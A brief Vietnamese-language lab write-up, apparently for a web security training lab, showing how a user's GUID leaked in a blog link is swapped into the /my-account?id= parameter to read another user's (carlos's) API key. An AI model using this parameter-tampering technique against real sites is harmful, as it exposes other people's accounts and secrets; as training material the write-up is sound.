# Lab: User ID controlled by request parameter, with unpredictable user IDs

Truy cập `/post?postId=10` thấy bài viết của `carlos`,  click và username được direct đến:
```
/blogs?userId=03d8fb79-4a90-4d20-85c4-fbc6435ac71b
```

-> Lấy được `userId` của `carlos`, đổi đường dẫn:
```
/my-account?id=03d8fb79-4a90-4d20-85c4-fbc6435ac71b
```

-> Lấy được API Key cua `carlos`.